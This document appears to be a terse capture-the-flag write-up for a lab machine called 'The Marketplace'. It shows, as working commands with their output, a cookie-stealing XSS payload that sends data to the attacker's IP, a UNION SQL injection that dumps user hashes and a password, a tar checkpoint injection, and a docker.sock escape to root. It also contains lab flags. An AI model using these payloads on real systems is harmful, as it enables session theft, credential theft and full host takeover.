# The_Marketplace 

> VOiD | Thursday 30 December 2021 12:25:12 PM UTC

My IP : 10.8.253.221
Target IP : 


## PORT 80 [http]
```bash
User-Agent: *
Disallow: /admin


http://10.10.189.254/new
<script>alert(1)</script>
have xss


<script>document.location='http://10.8.253.221/cookie?c='+document.cookie</script>

then we report 
http://10.10.142.223/report/3

we get 

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NDA4Njk0MDh9.10o8UiPAGsP9cXnkhsX3HYYWSRx0fvF7XP0GuGsrGEQ

THM{c37a63895910e478f28669b048c348d5}


http://10.10.142.223/admin?user=2%20union%20select%201,2,3
Error: ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT: The used SELECT statements have a different number of columns

http://10.10.142.223/admin?user=0%20union%20select%2011,22,33,44

http://10.10.142.223/admin?user=0%20union%20select%20database(),22,33,44
database()=marketplace

http://10.10.142.223/admin?user=0%20union%20select%20group_concat(table_name),22,33,44%20from%20information_schema.tables%20where%20table_schema=%22marketplace%22

items,messages,users

select group_concat(column_name),22,33,44 from information_schema.columns where table_schema="marketplace" and table_name="items"

http://10.10.142.223/admin?user=0%20union%20select%20group_concat(column_name),22,33,44%20from%20information_schema.columns%20where%20table_schema=%22marketplace%22%20and%20table_name=%22items%22

items: author,description,id,image,title
messages: id,is_read,message_content,user_from,user_to
users: id,isAdministrator,password,username

union select group_concat(username),22,33,44 from users

a,jake,michael,system

$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
$2b$10$NU1HZ7kyFjwTGSxh2Sgy/OG2zesuIAZHebpltNFml85Yp8DMSBCPy

union select group_concat(message_content),22,33,44 from messages


User Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,Thank you for your report. We have reviewed the listing and found nothing that violates our rules.,Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!,Thank you for your report. We have reviewed the listing and found nothing that violates our rules.

jake : @b_ENXkGYUCAv3zJ
```

## PORT 22 [ssh]
```bash
jake@the-marketplace:~$ cat user.txt 
THM{c3648ee7af1369676e3e4b15da6dc0b4}


User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh


echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

sudo -u michael /opt/backups/backup.sh


/var/run/docker.sock is writable

docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        16 months ago       2.16GB
nginx                        latest              4bb46517cac3        16 months ago       133MB
node                         lts-buster          9c4cc2688584        17 months ago       886MB
mysql                        latest              0d64f46acfd1        17 months ago       544MB
alpine                       latest              a24bb4013296        19 months ago       5.57MB


docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

root@e32f86271414:~# cat root.txt 
THM{d4f76179c80c0dcf46e0f8e43c9abd62}

```